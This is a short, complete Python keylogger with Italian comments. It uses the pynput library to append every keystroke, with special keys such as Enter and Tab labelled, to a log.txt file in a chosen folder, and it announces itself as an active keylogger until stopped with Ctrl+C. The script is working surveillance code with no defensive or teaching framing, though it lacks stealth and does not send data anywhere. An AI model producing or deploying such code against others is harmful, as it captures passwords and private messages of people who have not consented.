from pynput import keyboard
import os

# Percorso sicuro
folder = r"C:\Il tuo percorso"
os.makedirs(folder, exist_ok=True)  # Crea la cartella se non esiste
file_path = os.path.join(folder, "log.txt")

# Funzione chiamata ogni volta che viene premuto un tasto
def on_press(key):
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(file_path, "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("[ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write("[TAB]")
            else:
                f.write(f"[{key.name}]")

# Avvia l'ascolto della tastiera
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger attivo. Premi Ctrl+C per fermare.")
    listener.join()

